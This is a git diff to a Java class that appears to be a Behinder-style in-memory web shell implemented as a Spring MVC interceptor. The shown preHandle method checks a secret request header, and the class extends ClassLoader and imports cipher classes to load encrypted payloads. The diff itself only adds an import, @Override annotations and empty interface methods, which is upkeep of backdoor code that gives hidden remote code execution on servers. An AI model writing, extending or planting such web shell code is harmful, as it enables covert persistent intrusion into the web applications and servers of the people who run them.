@@ -1,6 +1,7 @@
 package com.reajason.javaweb.memshell.springmvc.behinder;
 
 import org.springframework.web.servlet.AsyncHandlerInterceptor;
+import org.springframework.web.servlet.ModelAndView;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -32,6 +33,7 @@ public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInte
     public BehinderInterceptor() {
     }
 
+    @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
             try {
@@ -55,6 +57,16 @@ public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInte
         }
     }
 
+    @Override
+    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
+
+    }
+
+    @Override
+    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+
+    }
+
     @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) {
         byte[] value = null;
@@ -72,5 +84,10 @@ public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInte
             }
         }
         return value;
+    }
+
+    @Override
+    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+
     }
 }
